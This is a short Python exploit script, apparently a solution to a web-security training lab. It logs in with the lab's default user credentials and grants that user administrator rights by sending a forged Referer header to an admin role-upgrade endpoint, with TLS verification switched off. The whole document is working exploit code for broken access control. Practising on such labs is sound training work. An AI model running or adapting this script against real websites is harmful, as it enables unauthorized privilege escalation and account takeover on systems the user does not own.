import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
  
    login_url = url+"/login"
    data = {"username":"wiener", "password":"peter"}
    r = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in r.text :
        print("(+) The wiener user has logged in successfully!")
        upgrade_url = url + '/admin-roles?username=wiener&action=upgrade'
        headers = {"Referer" : url+'/admin'}
        r = session.get(upgrade_url, headers=headers, verify=False, proxies=proxies)
        
        if 'Admin panel' in r.text :
            print("(+) The wiener user has been successfully upgraded.")
        else :
            print("(-) The wiener user could not be upgraded.")
            sys.exit(-1)
    else :
        print("Failed to login  as the wiener user.")
        sys.exit(-1)

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)